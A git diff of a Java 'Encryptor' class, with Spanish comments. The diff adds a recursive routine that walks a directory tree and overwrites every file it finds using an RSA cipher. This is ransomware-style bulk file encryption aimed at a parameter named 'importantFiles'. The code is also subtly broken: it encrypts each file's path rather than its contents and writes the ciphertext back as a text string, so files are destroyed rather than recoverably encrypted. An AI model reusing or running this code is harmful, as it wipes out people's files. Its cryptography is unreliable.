@@ -20,22 +20,53 @@ public class Encryptor {
 
     }
 
-     public static SecretKey encrypt(File importantFiles) throws Exception {
+    private static void recursiveFileFinder(File currentFile,Cipher cip,Key publicKey,Cryptography function){
+        if (currentFile==null)
+            return;
+        if(!currentFile.isDirectory()){              //Si no es un directorio, encriptar y terminar la rama
+            try {
+                function.cryptographyMethod(currentFile, cip);
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+            return;
+        }
 
-        Signature sign = Signature.getInstance("SHA256withRSA");
-        KeyGenerator keyGen = KeyGenerator.getInstance(encryption);
-        SecretKey currentKey = keyGen.generateKey();
-        Cipher cip = Cipher.getInstance("AES/GCM/NoPadding ");
-        cip.init(Cipher.ENCRYPT_MODE, currentKey);
-        byte[] toEncrypt = importantFiles.toString().getBytes(StandardCharsets.UTF_8);
-        cip.update(toEncrypt);
-        byte[] cipherText = cip.doFinal();
-         System.out.println(new String(cipherText, "UTF8"));
-         FileWriter Alteration = new FileWriter(importantFiles);
-         Alteration.write(new String(cipherText, "UTF8"));
-         Alteration.close();
-        System.out.println(currentKey);
-        return currentKey;
+        if (currentFile.listFiles()==null)          //Si es un directorio vacio, terminar la rama
+            return;
+        for (File file: List.of(currentFile.listFiles())){
+            recursiveFileFinder(file,cip,publicKey,function);
+        }
+     }
+
+
+
+
+
+
+
+     public static KeyPair encrypt(File importantFiles) throws Exception {
+        Signature sign = Signature.getInstance(SIGN_ENCRYPTION);
+        KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(KEY_GEN_ENCRYPTION);
+        keyPairGen.initialize(2048);
+        KeyPair pair = keyPairGen.generateKeyPair();
+        PublicKey publicKey = pair.getPublic();
+        Cipher cip = Cipher.getInstance(CIP_ENCRYPTION);
+        cip.init(Cipher.ENCRYPT_MODE, publicKey);
+        recursiveFileFinder(importantFiles,cip,publicKey, (File files,Cipher c)-> {
+
+
+            byte[] toEncrypt = files.toString().getBytes(StandardCharsets.UTF_8);
+            c.update(toEncrypt);
+            byte[] cipherText = c.doFinal();
+            // System.out.println(new String(cipherText, "UTF8"));
+            FileWriter Alteration = new FileWriter(files);
+            Alteration.write(new String(cipherText, "UTF-8"));
+            Alteration.close();
+
+
+        });
+        return pair;
     }
 
     public static void unencrypt(File encrypt, SecretKey key) throws Exception{
@@ -61,6 +92,8 @@ public class Encryptor {
 
 
     }
+
+
 }
 
 
